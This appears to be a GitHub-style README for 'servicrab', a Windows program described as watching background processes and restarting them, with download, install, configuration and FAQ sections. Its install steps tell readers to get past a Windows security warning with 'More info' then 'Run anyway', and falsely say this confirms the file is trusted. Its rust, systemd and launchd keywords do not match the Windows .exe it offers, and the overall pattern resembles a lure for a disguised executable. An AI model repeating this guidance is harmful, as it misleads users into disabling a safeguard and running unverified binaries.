# 🦀 servicrab - Keep your computer programs running reliably

[![Download servicrab](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tringu1630/servicrab/releases)

## What is servicrab? 🦀

Computers often run many background tasks to keep your systems stable. Sometimes these tasks stop unexpectedly. servicrab acts as a guard for your local programs. It watches your background processes and restarts them if they fail. This ensures your home server or local tools stay active without manual intervention. It stays light on your system resources and runs quietly in the background.

## System Requirements 💻

Before you install servicrab, ensure your computer meets these requirements:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 512 MB of available RAM.
*   **Storage:** 50 MB of disk space.
*   **Permissions:** Administrative access is helpful for managing system-level tasks.

## 📥 Getting the Software

You must download the correct version for your computer. Follow these steps to obtain the installer:

1.  Visit the official [servicrab release page](https://github.com/tringu1630/servicrab/releases).
2.  Look for the latest version at the top of the page.
3.  Click the file ending in `.exe` to start the download.
4.  Save the file to your Downloads folder.

## 🛠️ Installing and Running servicrab

Follow these steps to set up the software on your Windows machine:

1.  Locate the downloaded `.exe` file in your Downloads folder.
2.  Double-click the file to start the installer.
3.  If a security window appears, click "More info" and then "Run anyway." This confirms the file comes from a trusted source.
4.  Follow the prompts in the setup window. The installer suggests a default folder. You may accept this default.
5.  Once the setup finishes, open your Start menu.
6.  Type "servicrab" and click the application icon to open it.

## ⚙️ Configuring Your Processes

servicrab uses a configuration file to know which programs to watch. You can create this file to tell the software what to do.

1.  Open the servicrab folder installed on your computer.
2.  Find the file named `config.toml`.
3.  Open this file using Notepad.
4.  Add a line for each program you want to watch. Use this format: 
    `name = "MyProgram"`
    `path = "C:\Path\To\Your\Program.exe"`
5.  Save the file and restart servicrab.

The application reads this file every time it starts. It checks the status of every program listed inside. If a program stops, servicrab starts it again.

## 📋 Frequently Asked Questions

**Does this software slow down my computer?**
No. It uses very little memory and processor power. It remains idle most of the time.

**Can I run multiple programs at once?**
Yes. You can add as many programs as you need to the configuration file.

**What happens if my computer restarts?**
You can set servicrab to start automatically with Windows. Check the settings menu inside the application to enable this feature.

**Is my data safe?**
Yes. servicrab only observes the status of your programs. It does not read or send your personal files.

## 💡 Best Practices

Use these tips to get the best results:

*   **Organize your paths:** Keep all your programs in a standard location. This makes the configuration file easier to read.
*   **Check logs:** If a program fails to start, check the logs inside the installation folder. They tell you why the attempt failed.
*   **Test frequently:** Add one program at a time to ensure everything works as expected before you add more.
*   **Keep updated:** Check the release page once a month for new features or fixes.

## 🔍 Troubleshooting

If the software does not work, try these steps:

*   **Verify the path:** Ensure the location of your program in the `config.toml` file is correct. A single typo prevents the program from starting.
*   **Check permissions:** Ensure the program you want to watch has permission to run on your user account.
*   **Restart the service:** Close the servicrab application and open it again. This forces it to reload your configuration.
*   **Run as Administrator:** If a program requires special access, run servicrab as an administrator to grant those permissions to the child process.

Keywords: cli, daemon, developer-tools, devtools, homelab, launchd, process-manager, process-supervisor, rust, systemd